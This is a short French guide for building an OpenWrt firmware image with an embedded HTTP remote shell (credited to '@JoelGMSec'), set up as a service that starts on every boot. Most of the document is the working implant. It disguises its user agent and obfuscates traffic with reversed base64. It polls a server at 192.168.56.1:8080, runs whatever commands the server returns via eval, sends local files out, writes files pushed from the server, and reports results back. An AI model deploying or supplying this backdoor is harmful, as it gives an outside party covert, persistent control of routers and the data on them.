Paquets custom à ajouter dans OpenWrt:
`nano curl coreutils-base64`

Custom script à ajouter dans OpenWrt:
```bash
#!/bin/sh

set -e

# ===== CONFIG =====
INSTALL_PATH="/etc/init.d/monscript.sh"
SERVER="192.168.56.1:8080"
SLEEP_INTERVAL="20"
SERVICE_NAME="customscript"
# ==================

# ================== CUSTOM SCRIPT STARTS HERE ==================
echo "Creating script"
cat <<'EOF' > "$INSTALL_PATH"
#!/bin/sh
#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

server="http://192.168.56.1:8080"   # Set your server URL here
sleeps=5                          # Set your sleep interval (seconds) here
pwdnew="$(echo $PWD)"
cagent="Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"

# Custom reverse function
reverse() {
    echo "$1" | awk '{ for(i=length;i!=0;i--) x=x substr($0,i,1);} END{print x}'
}


# Functions
GetEnv() {
   usr="$(id -un | tr "[:upper:]" "[:lower:]")@$(uci get system.@system[0].hostname | tr "[:upper:]" "[:lower:]")"
   pwd="$pwdnew"
   echo "$usr!$pwd"
}

R64Encoder() {
   if [ "$1" = "-t" ]; then
      base64=$(echo -n "$2" | base64 | tr -d '\n' | tr "/+" "_-" | tr -d "=" | sed -e 's/[ \t]*//')
   elif [ "$1" = "-f" ]; then
      base64=$(base64 "$2" | tr -d '\n' | tr "+/" "-_" | sed "s/=*$//")
   fi
   revb64=$(reverse "$base64")
   echo "$revb64"
}

R64Decoder() {
   if [ "$1" = "-t" ]; then
      base64=$(reverse "$2" | tr "-" "+" | tr "_" "/" )
      base64_len=$(( ${#base64} % 4 ))
      if [ "$base64_len" -eq 2 ]; then
         base64+="=="
      elif [ "$base64_len" -eq 3 ]; then
         base64+="="
      fi
   fi   
   revb64=$(echo "$base64" | base64 -d)
   echo "$revb64"
}

# Main
while true; do
  if [ "$sleeps" ]; then
    sleep "$sleeps"
  fi
  
  env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
  request1=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/Info" -d "Info: $getenv64")
  response=$(curl --max-time 600 -A "$cagent" -s -k "$server/api/v1/Client/Token")
  token=$(echo "$response" | grep "Token: " | cut -d ' ' -f2)
  invoke64=$(R64Decoder -t "$token") ; param="Debug"

  if [ -n "$token" ]; then
      if [[ $invoke64 == "exit" ]]; then
         exit
      fi

      if [[ $invoke64 == upload* ]]; then
         file_path="${invoke64#upload }"
         file_path=$(echo $file_path | cut -d "!" -f 2)
         file_request=$(curl --max-time 600 -A "$cagent" -s -k -X GET "$server/api/v1/Client/Download")
         file_content=$(echo "$file_request" | grep "File: " | cut -d ' ' -f2)
         R64Decoder -t "$file_content" > "$file_path"
         unset invoke64 ; unset commandx
      fi

      if [[ $invoke64 == download* ]]; then
         file_path="${invoke64#download }"
         file_path=$(echo $file_path | cut -d "!" -f 1)
         file_content=$(R64Encoder -f "$file_path")
         download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/Upload" -d "File: $file_content")
         unset invoke64 ; unset commandx
      fi

      if [[ $invoke64 == cd* ]]; then
         new_dir="${invoke64#cd }"
         if [ "${new_dir:0:1}" != "/" ]; then
            new_dir="$pwdnew/$new_dir"
            new_dir=$(echo "$new_dir" | sed 's/["'\'']//g')
         fi
         if [ -d "$new_dir" ]; then
            cd "$new_dir"
            pwdnew=$(pwd)
            commandx="HTTPShellNull"
         else
            commandx="cd: $new_dir: No such file or directory"
            param="Error"
         fi

      else
         commandx=$(cd "$pwdnew" && eval "$invoke64" 2>&1)
         if [ $? -ne 0 ]; then
            param="Error"
         fi
      fi

      if [ -z "$commandx" ]; then
         commandx="HTTPShellNull"
      fi

      output64=$(R64Encoder -t "$commandx") ; path=$(echo "$param")
      request2=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/$path" -d "$param: $output64")

   fi
done
EOF
# ================== CUSTOM SCRIPT ENDS HERE ==================

echo "Making script executable..."
chmod +x "$INSTALL_PATH"

echo "Creating procd init script..."
cat <<EOF > "/etc/init.d/$SERVICE_NAME"
#!/bin/sh /etc/rc.common
START=99
STOP=10

start() {
    echo "Starting $SERVICE_NAME..."
    echo "Using host: $SERVER and sleep time: $SLEEP_INTERVAL"
    echo "Full command: sh "$INSTALL_PATH" -c "$SERVER" -s "$SLEEP_INTERVAL" &"
    sh "$INSTALL_PATH" -c "$SERVER" -s "$SLEEP_INTERVAL" &
}

stop() {
    echo "Stopping $SERVICE_NAME..."
    pkill -f "$INSTALL_PATH"
}
EOF

echo "Making init script executable..."
chmod +x "/etc/init.d/$SERVICE_NAME"

echo "Enabling service to start on boot..."
/etc/init.d/$SERVICE_NAME enable

echo "Starting service..."
/etc/init.d/$SERVICE_NAME start

echo "Setup complete. $SERVICE_NAME is now running."

exit 0
```

Ensuite il faut flasher le firmware OpenWrt avec ce script personnalisé. Après le redémarrage, le service sera actif et communiquera avec le serveur spécifié.
